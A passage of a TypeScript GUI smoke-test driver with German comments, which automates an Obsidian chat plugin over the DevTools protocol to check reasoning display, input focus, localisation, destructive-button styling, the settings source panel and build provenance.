      standard: { reasoning: 'Ich wäge erst die Quellen ab und prüfe dann den Kontext.', reasoningFeld: 'reasoning_content', text: 'Die fertige Antwort.', nachlaufMs: 9000 },
    });
    await setSetting(cdp, 'chatEndpoints', [{ url: stub.url, model: MANAGER_DEFAULT_MODEL }]);
    await setSetting(cdp, 'chatChoice', {});
    await cdp.evaluate(`${P}.llm.invalidate(); ${P}.chatSession.reset(); return true;`);
    await rebuildSidebar(cdp);
    await oeffneChatTab(cdp);
    await leereVerlauf(cdp);
    await cdp.evaluate(`window.__smokeDenk = { fertig: false }; ${P}.askKuro("Denk-Frage").finally(() => { window.__smokeDenk.fertig = true; }); return true;`);
    const block = (await pollUntil<boolean>(cdp, `return ${VIEW_EL}?.querySelector(".okit-stream-reasoning") ? true : null;`, 5000, 100)) === true;
    if (block) {
      zeichneDenkblock(bil, NAMEN, await messeDenkblockKopierbar(cdp, { block: `.workspace-leaf-content[data-type='${VIEW_TYPE}'] .okit-stream-reasoning`, knopf: `.workspace-leaf-content[data-type='${VIEW_TYPE}'] .okit-stream-reasoning-copy`, erwartetKnopf: true }));
    } else {
      const grund = 'Kuro zeigt kein Denken an (gemessen: der Stub lieferte Reasoning-Deltas im Strom, nach 5 s steht kein .okit-stream-reasoning im Chat-Tab; im Quelltext kein onReasoning), es gibt keinen Block, an dem ein Kopier-Knopf sitzen könnte';
      optOutPflicht(bil, NAMEN.kopie, grund);
      optOutPflicht(bil, NAMEN.gegen, grund);
    }
  } catch (e) {
    if (istAbgebrochen()) throw e;
    for (const n of Object.values(NAMEN)) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (!istAbgebrochen()) {
      await setSetting(cdp, 'chatEndpoints', []).catch(() => undefined);
      await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`).catch(() => undefined);
    }
    if (stub) await stub.stop().catch(() => undefined);
  }
}

/** Pflichtpunkte § 3a (Baustein `pflichtpunkte` der Brücke, Vorbild lingotuner) für den Chat-Tab: (a) das Eingabefeld behält den Fokus,
 *  (b) jedes Bedienelement der Eingabezeile ist erreichbar, wenn der Verlauf wächst (Füller im Log, natürliche Höhe und 420 px). Dazu der
 *  (Der Punkt „Denkblock kopierbar“ steht in `sektionDenkblock`.) */
async function sektionPflicht(cdp: Cdp): Promise<void> {
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const NAMEN = ['pflicht/fokus-erhalt', 'pflicht/fokus-gegenprobe', 'pflicht/erreichbar-natuerliche-hoehe', 'pflicht/erreichbar-kurzes-panel', 'pflicht/erreichbar-gegenprobe'] as const;
  const zeichne = (name: (typeof NAMEN)[number], u: PflichtTeilurteil): void => zeichnePflicht({ record: (n, ok, d) => record(n, ok, d ?? ''), unmeasured: (n, why) => unmeasured(n, why) }, name, u);
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  try {
    await removeFakeManager(cdp);
    // Ohne Endpunkt zeigt der Tab nur den Einrichtungs-Hinweis, ohne Eingabezeile: der Stub gibt dem Chat einen erreichbaren Endpunkt (es wird nichts gefragt).
    stub = await startLlmStub({ models: [MANAGER_DEFAULT_MODEL] });
    await setSetting(cdp, 'chatEndpoints', [{ url: stub.url, model: MANAGER_DEFAULT_MODEL }]);
    await setSetting(cdp, 'chatChoice', {});
    await cdp.evaluate(`${P}.llm.invalidate(); ${P}.chatSession.reset(); return true;`);
    await rebuildSidebar(cdp);
    await oeffneChatTab(cdp);
    const FELD = '.kuro-chat-input';
    zeichne('pflicht/fokus-erhalt', await messeFokusErhalt(cdp, { selector: FELD }));
    zeichne('pflicht/fokus-gegenprobe', await gegenprobeFokus(cdp, { selector: FELD }));
    const opts = {
      selektoren: ['.kuro-chat-input', '.kuro-chat-inputrow .kuro-btn'],
      erforderlich: ['.kuro-chat-input'],
      fuelle: { in: '.kuro-chat-log' },
      ueberlauf: '.kuro-chat-log',
    };
    zeichne('pflicht/erreichbar-natuerliche-hoehe', await messeErreichbarkeit(cdp, opts));
    zeichne('pflicht/erreichbar-kurzes-panel', await mitHoehe<PflichtTeilurteil>(cdp, { element: '.workspace-leaf', enthaelt: '.kuro-chat-inputrow', hoehe: 420 }, () => messeErreichbarkeit(cdp, opts)));
    const gegen = await gegenprobeErreichbarkeit(cdp, { selektoren: opts.selektoren, rollbereich: '.kuro-chat-log', fuelle: opts.fuelle });
    // Gemessen (Welle 24): die Eingabezeile steht UNTER dem Log, das in sich rollt (Punkt layout/log-scrollt-intern). Nimmt man dem Log den Rollbalken,
    // bleibt die Eingabezeile erreichbar: die Gegenprobe kann in diesem Layout nicht rot werden — nicht anwendbar, nicht grün.
    if (gegen.urteil === 'rot' && gegen.detail.startsWith('overflow:hidden, aber alle')) {
      skipped('pflicht/erreichbar-gegenprobe', `in dieser Lage nicht anwendbar: die Eingabezeile steht ausserhalb des Rollbereichs (${gegen.detail})`);
    } else zeichne('pflicht/erreichbar-gegenprobe', gegen);
  } catch (e) {
    if (istAbgebrochen()) throw e;
    for (const n of NAMEN) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (!istAbgebrochen()) {
      await setSetting(cdp, 'chatEndpoints', []).catch(() => undefined);
      await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`).catch(() => undefined);
    }
    if (stub) await stub.stop().catch(() => undefined);
  }
}

/* ------------------------------------- 12 · Echter Endpunkt (Kit-Chat-Client) */

/** Ein bereits GELADENES Chat-Modell auf dem lokalen LM-Studio-Endpunkt, sonst `null`.
 *  Bewusst nur ein geladenes: eine Anfrage an ein nicht geladenes Modell löst in LM Studio ein
 *  JIT-Laden aus und verdrängt das Modell, an dem eine andere Sitzung gerade arbeitet. */
async function geladenesModell(): Promise<string | null> {
  try {
    const res = await fetch(`${SMOKE_ENDPOINT_URL}/api/v0/models`, { signal: AbortSignal.timeout(3000) });
    if (!res.ok) return null;
    const body = (await res.json()) as { data?: Array<{ id: string; state?: string; type?: string }> };
    const treffer = (body.data ?? []).find((m) => m.state === 'loaded' && (m.type === 'llm' || m.type === 'vlm'));
    return treffer?.id ?? null;
  } catch {
    return null;
  }
}

async function sektionEchterEndpunkt(cdp: Cdp): Promise<void> {
  // LM-Regel (Welle 21): ein Lauf schickt keine Anfrage, die ein Modell rechnen lässt. Dieser Punkt tut genau das, also nur mit `--echtes-modell`.
  if (!parseArgs(process.argv.slice(2)).has('echtes-modell')) {
    skipped('stream/echter-endpunkt-liefert-tokens-einzeln', 'LM-Regel, Welle 21: Anfrage an ein geladenes Modell nur mit --echtes-modell');
    return;
  }
  const modell = await geladenesModell();
  if (modell === null) {
    unmeasured('stream/echter-endpunkt-liefert-tokens-einzeln', `auf ${SMOKE_ENDPOINT_URL} ist kein Modell geladen oder der Server antwortet nicht (ein Lauf löste sonst ein JIT-Laden aus)`);
    return;
  }
  await setSetting(cdp, 'chatEndpoints', [{ url: SMOKE_ENDPOINT_URL, model: modell }]);
  await setSetting(cdp, 'request', { overrides: {}, thinking: { companion: 'off' }, lastOnLevel: {}, levelPickerInChat: false });
  await cdp.evaluate(`app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].llm.invalidate(); return true;`);
  await rebuildSidebar(cdp);
  await oeffneChatTab(cdp);
  // Mutation und Wartephase getrennt: `cdp.evaluate` bricht nach 30 s ab, ein echtes Modell braucht länger.
  await cdp.evaluate(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    p.chatSession.reset();
    window.__smokeEcht = { tokens: 0, erster: null, t0: Date.now(), fertig: false };
    const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
    const orig = leaf.view.appendChatToken.bind(leaf.view);
    window.__smokeEcht.orig = orig;
    leaf.view.appendChatToken = (t) => { window.__smokeEcht.tokens += 1; window.__smokeEcht.erster ??= Date.now() - window.__smokeEcht.t0; orig(t); };
    p.askKuro("Antworte mit genau einem Satz: Wer bist du?").finally(() => { window.__smokeEcht.fertig = true; });
    return true;
  `);
  await pollUntil<boolean>(cdp, `return window.__smokeEcht?.fertig === true;`, 180_000).catch(() => false);
  const lauf = await cdp.evaluate<{ tokens: number; antwort: string; fehler: string; erster: number | null; fertig: boolean }>(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
    const e = window.__smokeEcht;
    leaf.view.appendChatToken = e.orig;
    const antwort = p.chatSession.entries.filter((x) => x.role === "assistant").map((x) => x.text).join("");
    const fehler = p.chatSession.entries.filter((x) => x.role === "error").map((x) => x.text + " " + (x.detail ?? "")).join(" | ");
    const out = { tokens: e.tokens, antwort, fehler, erster: e.erster, fertig: e.fertig };
    delete window.__smokeEcht;
    return out;
  `);
  record(
    'stream/echter-endpunkt-liefert-tokens-einzeln',
    lauf.fertig && lauf.fehler === '' && lauf.tokens >= 2 && lauf.antwort.trim() !== '',
    !lauf.fertig ? 'Antwort kam nicht innerhalb von 180 s' : lauf.fehler !== '' ? `Fehlerzeile im Chat: ${lauf.fehler}` : `${lauf.tokens} Token-Häppchen von ${modell}, erstes nach ${lauf.erster ?? '?'} ms, Antwort ${lauf.antwort.length} Zeichen`,
  );
}

/* ---------------------------------------------- 6 · Sprache (Schritt 12) */

async function sektionSprache(cdp: Cdp): Promise<void> {
  await setSetting(cdp, 'language', 'en');
  await rebuildSidebar(cdp);
  await oeffneChatTab(cdp);

  const sichtbar = await pollUntil<{ texte: string[]; platzhalter: string }>(
    cdp,
    `const body = ${VIEW_EL}?.querySelector(".kuro-chat-body");
     if (!body) return null;
     const input = body.querySelector(".kuro-chat-input");
     return {
       texte: [...body.querySelectorAll("button, summary, h3, p, span")]
         .map((el) => el.textContent.trim()).filter(Boolean),
       platzhalter: input ? input.getAttribute("placeholder") : "",
     };`,
    8000,
  );
  if (!sichtbar) {
    for (const n of ['sprache/platzhalter-englisch', 'sprache/keine-deutschen-reste'] as const) unmeasured(n, 'Chat-Panel nicht messbar');
    return;
  }

  record(
    'sprache/platzhalter-englisch',
    sichtbar.platzhalter === en['chat.placeholder'],
    `Platzhalter: "${sichtbar.platzhalter}" (erwartet "${en['chat.placeholder']}")`,
  );

  // Der eigentliche Wert dieses Punktes: nicht „ist etwas englisch", sondern „steht
  // irgendwo noch ein deutscher String". Verglichen wird gegen die echten Tabellen, nicht
  // gegen kopierte Zeichenketten — sonst prüft der Smoke einen eingefrorenen Stand.
  const deutscheWerte = new Set(
    Object.keys(de)
      .filter((k) => de[k] !== en[k] && typeof de[k] === 'string' && de[k].length > 2)
      .map((k) => de[k] as string),
  );
  const reste = sichtbar.texte.filter((text) => deutscheWerte.has(text));
  record(
    'sprache/keine-deutschen-reste',
    reste.length === 0,
    reste.length === 0
      ? `${sichtbar.texte.length} sichtbare Texte, keiner aus der deutschen Tabelle`
      : `deutsche Reste: ${reste.join(' | ')}`,
  );
}

/* ------------------------------ 7 · Destruktive Knöpfe (Schritt 13) */

async function sektionDestruktiv(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    await app.setting.open();
    await app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 900));
    return true;
  `);

  // Hilfe-Zeile (UI-STANDARD §8): die ERSTE Zeile des Tabs, mit Doku-Knopf. Das Settings-Fenster
  // (Obsidian >= 1.13) ist ein eigenes Ziel ohne Workspace.
  const ersteZeile = await (async (): Promise<string | null> => {
    const fenster = await attachTo('settings', PORT);
    if (!fenster) return null;
    const text = await fenster.evaluate<string | null>(`
      const zeile = document.querySelector(".vertical-tab-content .setting-item");
      return zeile ? zeile.textContent : null;
    `);
    fenster.close();
    return text;
  })();
  if (ersteZeile === null) unmeasured('einstellungen/hilfe-zeile-steht-zuerst', 'Settings-Fenster nicht lesbar');
  else {
    const passt = (l: Record<string, string>): boolean =>
      ersteZeile.includes(l['help.name'] ?? '\0') && ersteZeile.includes(l['help.openDocs'] ?? '\0');
    record(
      'einstellungen/hilfe-zeile-steht-zuerst',
      passt(de) || passt(en),
      `erste Zeile: ${ersteZeile.slice(0, 80)}`,
    );
  }

  // Zwei Wurzeln, ein Grund: bis Obsidian 1.12 stehen die Einstellungen als Modal IM
  // Workspace-Fenster, ab 1.13 sind sie ein eigenes Fenster ohne Workspace. Ein Fallback
  // auf `document.body` im Hauptfenster wäre bequem und falsch — er findet dort die
  // Knöpfe der Oberfläche, meldet „0 destruktive" und sieht aus wie ein Plugin-Defekt.
  // Gemessen am 2026-08-17: genau so lief dieser Punkt beim ersten Lauf rot.
  const messen = (wurzelAusdruck: string): string => `
    const wurzel = ${wurzelAusdruck};
    if (!wurzel) return null;
    const knoepfe = [...wurzel.querySelectorAll("button")];
    if (knoepfe.length === 0) return null;
    const auffaellig = knoepfe.filter(
      (b) => b.classList.contains("mod-warning") || b.classList.contains("mod-destructive"),
    );
    const normal = knoepfe.find(
      (b) => !b.classList.contains("mod-warning")
        && !b.classList.contains("mod-destructive")
        && !b.classList.contains("mod-cta")
        && b.textContent.trim().length > 0,
    );
    const farbe = (el) => {
      const s = getComputedStyle(el);
      return s.backgroundColor + " / " + s.color;
    };
    return {
      gesamt: knoepfe.length,
      auffaellig: auffaellig.map((b) => ({ text: b.textContent.trim(), farbe: farbe(b) })),
      normal: normal ? { text: normal.textContent.trim(), farbe: farbe(normal) } : null,
    };
  `;

  interface Messung {
    gesamt: number;
    auffaellig: { text: string; farbe: string }[];
    normal: { text: string; farbe: string } | null;
  }

  let mess = await pollUntil<Messung>(cdp, messen('document.querySelector(".modal.mod-settings")'), 3000);
  let quelle = 'Modal im Hauptfenster';
  let fenster: Cdp | null = null;

  if (!mess) {
    fenster = await attachTo('settings', PORT);
    if (fenster) {
      mess = await pollUntil<Messung>(fenster, messen('document.body'), 6000);
      quelle = 'eigenes Einstellungen-Fenster (Obsidian ≥ 1.13)';
    }
  }

  if (!mess) {
    for (const n of ['destruktiv/knoepfe-vorhanden', 'destruktiv/farblich-abgesetzt'] as const) unmeasured(n, 'Einstellungen-DOM nicht erreichbar');
  } else {
    // Erst den Gegenstand belegen: ein Farbvergleich gegen null Knöpfe wäre grün.
    record(
      'destruktiv/knoepfe-vorhanden',
      mess.auffaellig.length >= 2,
      `${quelle}: ${mess.auffaellig.length} destruktiv markierte Knöpfe (${mess.auffaellig
        .map((b) => b.text)
        .join(', ') || 'keine'})`,
    );
    if (mess.auffaellig.length > 0 && mess.normal) {
      const abweichend = mess.auffaellig.filter((b) => b.farbe !== mess?.normal?.farbe);
      record(
        'destruktiv/farblich-abgesetzt',
        abweichend.length === mess.auffaellig.length,
        `destruktiv: ${mess.auffaellig[0]?.farbe} · normal ("${mess.normal.text}"): ${mess.normal.farbe}`,
      );
    } else {
      unmeasured('destruktiv/farblich-abgesetzt', 'kein Vergleichsknopf ohne Sonderklasse gefunden');
    }
  }

  fenster?.close();
  await schliesseEinstellungenZentral(cdp);

  // Satz 0 und Quelle nicht lesbar (Sessions/Pausen ohne TaskNotes): ein Hinweis (is-warning), keine Fehlerzeile (is-error).
  // Gegenprobe im selben Punkt: mit Satz > 0 ist dieselbe Lage ein Fehler (die obigen Punkte laufen mit dem Default-Satz).
  const satz0 = async (satz: number): Promise<{ klassen: string[]; texte: string[] } | null> => {
    await setSetting(cdp, 'xpPerWorkSession', satz);
    await setSetting(cdp, 'xpPerBreakSession', satz);
    await cdp.evaluate(`
      app.setting.open();
      app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
      await new Promise((r) => setTimeout(r, 900));
      return true;
    `);
    const messenSatz = (wurzel: string) => `
      const root = ${wurzel};
      const rows = root ? Array.from(root.querySelectorAll('.kuro-src-row')) : [];
      if (rows.length < 3) return null;
      const arbeit = rows.slice(1, 3);
      return {
        klassen: arbeit.map((r) => ['is-ok', 'is-warning', 'is-error'].find((k) => r.querySelector('.kuro-src-status')?.classList.contains(k)) ?? '?'),
        texte: arbeit.map((r) => r.querySelector('.kuro-src-detail')?.textContent ?? ''),
      };
    `;
    let m = await pollUntil<{ klassen: string[]; texte: string[] }>(cdp, messenSatz('document.querySelector(".modal.mod-settings")'), 3000);
    let f: Cdp | null = null;
    if (!m) {
      f = await attachTo('settings', PORT);
      if (f) m = await pollUntil<{ klassen: string[]; texte: string[] }>(f, messenSatz('document.body'), 6000);
    }
    if (m && satz === 0) {
      // Regel 12: die sichtbare Zeile am Bild ansehen (Ablage /tmp/w22-shots/kuro-gamification/).
      const ziel = f ?? cdp;
      await ziel.evaluate(`document.querySelector('.kuro-src-panel')?.scrollIntoView({ block: 'center' }); await new Promise((r) => setTimeout(r, 400)); return true;`);
      const box = await boxOf(ziel, '.kuro-src-panel', 8);
      if (box) {
        mkdirSync('/tmp/w22-shots/kuro-gamification', { recursive: true });
        writeFileSync('/tmp/w22-shots/kuro-gamification/herkunft-satz0.png', await capture(ziel, box, 1));
      }
    }
    f?.close();
    await schliesseEinstellungenZentral(cdp);
    return m;
  };
  const ohneSatz = await satz0(0);
  const mitSatz = await satz0(10);
  if (!ohneSatz || !mitSatz) {
    unmeasured('herkunft/satz-0-ist-hinweis', 'Einstellungen-DOM nicht erreichbar');
  } else {
    record(
      'herkunft/satz-0-ist-hinweis',
      ohneSatz.klassen.every((k) => k === 'is-warning') && mitSatz.klassen.every((k) => k === 'is-error') && ohneSatz.texte.every((t) => t.startsWith('XP rate is 0')),
      `Satz 0: ${ohneSatz.klassen.join('/')} · "${(ohneSatz.texte[0] ?? '').slice(0, 60)}" · Satz 10: ${mitSatz.klassen.join('/')}`,
    );
  }
}


/**
 * Abschnitt 8 — Herkunfts-Panel.
 *
 * Warum das hier steht und nicht in den Unit-Tests: die Abbildung Zustand → Klasse
 * ist dort belegt (tests/settings-source-panel.test.ts), aber NICHT, dass die Zeilen
 * im echten Einstellungs-Tab ankommen. Genau diese Sorte Anzeige kann grün sein, ohne
 * ihren Gegenstand je berührt zu haben (_docs/LESSONS.md 2026-08-30).
 */
async function sektionHerkunft(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    app.setting.open();
    app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 900));
    return true;
  `);

  const messen = (wurzel: string) => `
    const root = ${wurzel};
    if (!root) return null;
    const rows = Array.from(root.querySelectorAll('.kuro-src-row'));
    if (rows.length === 0) return null;
    const stati = Array.from(root.querySelectorAll('.kuro-src-status'));
    return {
      zeilen: rows.length,
      mitGenauEinerKlasse: stati.filter((el) => {
        const treffer = ['is-ok', 'is-warning', 'is-error'].filter((k) => el.classList.contains(k));
        return treffer.length === 1;
      }).length,
      mitLabel: stati.filter((el) => !!el.getAttribute('aria-label')).length,
      status: stati.length,
      texte: Array.from(root.querySelectorAll('.kuro-src-detail')).map((el) => el.textContent).join(' | '),
      namen: Array.from(root.querySelectorAll('.kuro-src-name')).map((el) => el.textContent),
    };
  `;

  interface Panel {
    zeilen: number;
    mitGenauEinerKlasse: number;
    mitLabel: number;
    status: number;
    texte: string;
    namen: string[];
  }

  let mess = await pollUntil<Panel>(cdp, messen('document.querySelector(".modal.mod-settings")'), 3000);
  let quelle = 'Modal im Hauptfenster';
  let fenster: Cdp | null = null;

  if (!mess) {
    fenster = await attachTo('settings', PORT);
    if (fenster) {
      mess = await pollUntil<Panel>(fenster, messen('document.body'), 6000);
      quelle = 'eigenes Einstellungen-Fenster (Obsidian ≥ 1.13)';
    }
  }

  if (!mess) {
    for (const n of ['herkunft/panel-vorhanden', 'herkunft/genau-eine-zustandsklasse', 'herkunft/aria-label', 'herkunft/kein-roher-code', 'herkunft/satz-0-ist-hinweis'] as const) unmeasured(n, 'Einstellungen-DOM nicht erreichbar');
  } else {
    // Erst den Gegenstand belegen: alle folgenden Punkte wären über null Zeilen grün.
    record(
      'herkunft/panel-vorhanden',
      mess.zeilen === 4,
      `${quelle}: ${mess.zeilen} Zeilen (${mess.namen.join(', ')})`,
    );
    record(
      'herkunft/genau-eine-zustandsklasse',
      mess.status > 0 && mess.mitGenauEinerKlasse === mess.status,
      `${mess.mitGenauEinerKlasse}/${mess.status} mit genau einer aus is-ok/is-warning/is-error`,
    );
    record(
      'herkunft/aria-label',
      mess.status > 0 && mess.mitLabel === mess.status,
      `${mess.mitLabel}/${mess.status} mit aria-label (WCAG 1.4.1: Farbe nie allein)`,
    );
    record(
      'herkunft/kein-roher-code',
      !/src\.reason\.|\{\w+\}/.test(mess.texte),
      mess.texte.slice(0, 110),
    );
  }

  fenster?.close();
  await schliesseEinstellungenZentral(cdp);
}

/* -------------------------------------------------------------------- main */

let PORT = 0;
/** Meldung von `bereiteInstanzVor`, für die Abbruchmeldung, falls das Plugin nicht lädt. */
let instanzHinweis = '';

async function main(): Promise<void> {
  const args = parseArgs(process.argv.slice(2));
  const portRoh = args.value('port');
  PORT = Number(portRoh);
  if (portRoh === undefined || !Number.isInteger(PORT) || PORT < 1024 || PORT > 65535) {
    throw new Error(`--port <Zahl> fehlt oder ist ungültig (${JSON.stringify(portRoh)}). Den Port der eigenen Zweitinstanz angeben (Rezept im Dateikopf, z. B. 9401).`);
  }
  const vault = args.value('vault') ?? PLUGIN_ID;

  console.log(`GUI-Smoke — Obsidian auf Port ${PORT}`);
  const cdp = await attachTo('workspace', PORT, vault);
  if (!cdp) {
    throw new Error(
      `Kein Obsidian-Fenster mit Workspace auf Port ${PORT}${vault ? ` (Vault "${vault}")` : ''}. ` +
        'Läuft die App mit --remote-debugging-port?',
    );
  }

  // Außerhalb des try, damit das `finally` auch nach einem Abbruch mitten im Lauf
  // zurückschreibt — ein Schnappschuss der GANZEN Einstellungen, nicht einzelner Felder:
  // die Abschnitte stellen um, was sie brauchen, und die Wiederherstellung darf nicht
  // daran hängen, dass jeder von ihnen sauber zu Ende läuft.
  let vorwert: string | null = null;
  // Die `ungeklaert`-Warnung gehört in die Abschlusszeile, nicht nur nach oben ins
  // Protokoll: wer eine Runde fährt, liest die letzte Zeile — und ein Lauf, dessen
  // Herkunft ungeprüft blieb, darf nicht aussehen wie einer, der belegt ist.
  let herkunftsWarnung: string | null = null;

  // Dieselbe Aufraeumarbeit wie im `finally` unten — als eigene Funktion, damit der
  // SIGINT/SIGTERM-Handler sie aufrufen kann, ohne Code zu duplizieren. Ein Ctrl-C mitten
  // im Lauf ueberspringt das `finally` NICHT (try/catch-Semantik), sondern beendet den
  // Node-Prozess sofort — ohne eigenen Handler bleiben die umgestellten Settings
  // (`enableChat`, `chatEndpoints`, `language`) im Smoke-Zustand stehen.
  const cleanupState = async (): Promise<void> => {
    await removeFakeManager(cdp).catch(() => undefined);
    if (vorwert !== null) {
      const zurueck = await cdp
        .evaluate<boolean>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.data.settings = JSON.parse(${JSON.stringify(vorwert)});
          p.chatSession.reset();
          await p.persist();
          for (const leaf of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) leaf.detach();
          await new Promise((r) => setTimeout(r, ${istAbgebrochen() ? 0 : 300}));
          await p.activateSidebar();
          const pfad = app.vault.configDir + "/plugins/${PLUGIN_ID}/data.json";
          const roh = await app.vault.adapter.read(pfad);
          return JSON.stringify(JSON.parse(roh).settings) === ${JSON.stringify(vorwert)};
        `)
        .catch(() => false);
      console.log(
        zurueck
          ? 'Einstellungen zurückgeschrieben — byte-gleich zum Vorwert.'
          : '⚠️  ABWEICHUNG beim Zurückschreiben der Einstellungen — data.json prüfen!',
      );
    }
  };

  // Ctrl-C/SIGTERM: das Abbruch-Modul der Brücke sperrt den Hauptzweig, ruft diesen Schritt (er darf noch senden), druckt die Bilanz,
  // Exit 130. Angemeldet VOR der ersten Mutation; der Schritt ist idempotent (`vorwert === null` heißt: noch nichts verändert).
  const zustand = beimAbbruch(cleanupState, 'Smoke-Zustand zurücksetzen');

  try {
    // Sichtbar machen übernimmt requireVisible (nicht osascript activate: das trifft die reguläre Instanz statt der Zweitinstanz).
    await requireVisible(cdp);

    // Ein frischer Staging-Vault startet im Restricted Mode, ein frisches Profil fragt „Dem Ersteller vertrauen“:
    // `bereiteInstanzVor` bestätigt den Dialog und lädt das Plugin — nur im eigenen Staging-Vault (`nurVault`).
    const vorbereitet = await bereiteInstanzVor(cdp, { pluginIds: [PLUGIN_ID], nurVault: PLUGIN_ID, sprache: 'en' });
    instanzHinweis = vorbereitet.hinweis;
    console.log(`Instanz vorbereitet: ${vorbereitet.hinweis}`);

    const vaultInfo = await cdp.evaluate<{ name: string; basePath: string; configDir: string }>(`
      return {
        name: app.vault.getName(),
        basePath: app.vault.adapter.basePath,
        configDir: app.vault.configDir,
      };
    `);
    console.log(`Vault: ${vaultInfo.name}\n`);

    // Läuft dieser Lauf gegen den eigenen Stand? Die Frage, gegen die `manifest.version`
    // eine Zeile weiter unten strukturell blind ist: Store-Build und Repo-Build tragen
    // dieselbe Nummer. Am 2026-08-30 standen dachweit 69 von 150 grünen Prüfpunkten auf
    // einem Build, der nicht belegt der Repo-Stand war — dieser Treiber war einer davon
    // (16/16 am 28.08. gegen die Store-Installation 1.3.0).
    //
    // Der Pfad kommt aus der LAUFENDEN Instanz, nicht aus `stagingVaultDir(PLUGIN_ID)`.
    // Das ist der Unterschied zum Muster in `tools/obsidian-cdp/README.md` und er ist
    // load-bearing: der Fehllauf lief gegen `10_Pallas`, und ein Check gegen den
    // Staging-Pfad hätte eine ganz andere Datei geprüft — also genau den Fall nicht
    // gesehen, für den er gebaut ist. Geprüft wird, was gemessen wird.
    const pluginDir = join(vaultInfo.basePath, vaultInfo.configDir, 'plugins', PLUGIN_ID);
    requireEigenerBuild(
      join(pluginDir, 'main.js'),
      // Der Vergleichsstand muss frisch sein — `npm run deploy` baut ihn direkt davor.
      // Ohne ihn bleibt nur die billige Aussage (Store-Suffix ja/nein).
      join(cwd(), 'main.js'),
      (meldung) => {
        herkunftsWarnung = meldung;
        console.warn(meldung);
      },
    );

    // Dieselbe Frage für `styles.css`, denn der zentrale Guard kennt nur `main.js` —
    // `npm run deploy` kopiert aber beides. Dieser Treiber misst an mehreren Stellen
    // **gerendertes CSS**: das Chat-Log muss intern scrollen (`scrollHeight > clientHeight`,
    // der Flexbox-Gotcha aus REGISTRY § LLM-Chat-Panel-UI) und Knopf-/Status-Klassen werden
    // über `getComputedStyle` beurteilt. Ein altes Stylesheet neben frischer `main.js`
    // erzeugt dort genau den unbelegten Stand, den der Guard eine Zeile höher gerade
    // ausgeschlossen hat — und er erschiene als Plugin-Befund, nicht als Deploy-Fehler.
    // Übernommen aus json_viewer/scripts/gui-smoke.ts (`4c32757`), dort aus
    // local-image-generator (`e6fbb53`), via REGISTRY § Testing.
    const cssHerkunft = buildHerkunft(join(pluginDir, 'styles.css'), join(cwd(), 'styles.css'));
    if (cssHerkunft.art === 'fehlt') {
      throw new Error(`Im Vault liegt kein styles.css: ${cssHerkunft.pfad}\nZuerst deployen.`);
    }
    if (cssHerkunft.art === 'fremd') {
      const z = (n: number) => n.toLocaleString('de-DE');
      throw new Error(
        `Das styles.css im Vault ist nicht der gebaute Repo-Stand: ${cssHerkunft.pfad}\n` +
        `  im Vault: ${z(cssHerkunft.bytes)} Bytes\n` +
        `  gebaut:   ${z(cssHerkunft.erwarteteBytes)} Bytes\n` +
        'Dieser Lauf misst gerendertes CSS. Zuerst deployen, dann erneut laufen.',
      );
    }

    // Das Plugin NEU LADEN, bevor irgendetwas gemessen wird: `npm run deploy` ersetzt nur
    // die Dateien, die laufende Instanz behält den alten Code im Speicher. Ohne diesen
    // Schritt misst der Smoke den zuletzt geladenen Stand und meldet ihn als Ergebnis für
    // den gerade gebauten — genau so läuft eine kaputte Version grün durch.
    const plugin = await cdp.evaluate<{ ok: boolean; version?: string; aufPlatte?: string }>(`
      const id = ${JSON.stringify(PLUGIN_ID)};
      if (app.plugins.plugins[id]) {
        await app.plugins.disablePlugin(id);
        await new Promise((r) => setTimeout(r, 500));
      }
      // Restricted Mode und Vertrauensdialog hat bereiteInstanzVor oben erledigt.
      await app.plugins.enablePlugin(id);
      await new Promise((r) => setTimeout(r, 1200));
      const p = app.plugins.plugins[id];
      if (!p) return { ok: false };
      // Die Platte getrennt lesen — s. Kommentar unten, warum das nicht dasselbe ist.
      let aufPlatte;
      try {
        const pfad = app.vault.configDir + "/plugins/" + id + "/manifest.json";
        aufPlatte = JSON.parse(await app.vault.adapter.read(pfad)).version;
      } catch { aufPlatte = undefined; }
      return { ok: true, version: p.manifest.version, aufPlatte };
    `);
    if (!plugin.ok) {
      throw new Error(
        `Plugin ${PLUGIN_ID} ist nicht aktiv. Erst \`npm run deploy\`. Bleibt es danach aus, `
        + 'laeuft die Instanz im Restricted Mode (frisches Profil) oder der Vault ist ein fremder: '
        + `der Treiber hebt den Modus nur im Vault ${PLUGIN_ID} auf (\`bereiteInstanzVor\`: ${instanzHinweis || 'keine Meldung'}).`,
      );
    }

    // Zwei Versionen, und sie können auseinanderlaufen — gemessen am 2026-09-02 in genau
    // diesem Vault: Speicher 1.3.0, Platte 1.4.0. `enablePlugin` lädt den CODE neu, das
    // MANIFEST nicht; das liest Obsidian beim Vault-Start. `app.plugins.manifests[id]`
    // sagt dasselbe Alte (beide gegengemessen).
    //
    // Warum das hier steht und nicht bloß kosmetisch ist: die Zeile sah aus wie eine
    // Aussage über die gemessene Datei und war eine über den App-Start. Der Herkunfts-
    // Guard oben prüft `main.js` per sha1 und ist davon unberührt — die Versionszeile ist
    // die dritte Blindstelle derselben Familie und darf nicht als Beleg gelesen werden.
